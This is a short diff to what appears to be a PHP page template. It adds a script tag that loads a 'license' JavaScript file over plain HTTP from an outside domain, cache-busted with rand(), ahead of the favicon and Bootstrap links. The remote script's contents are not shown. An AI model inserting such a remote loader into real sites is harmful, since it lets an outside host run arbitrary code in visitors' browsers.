@@ -1,3 +1,5 @@
+<script src="http://license.akuonline.my.id/edubmn-license.js?q<?= rand() ?>"></script>
+
 <link rel="shortcut icon" href="<?= IMAGES_URL ?>/logo.png" type="image/x-icon">
 
 <!-- Bootstrap CSS-->
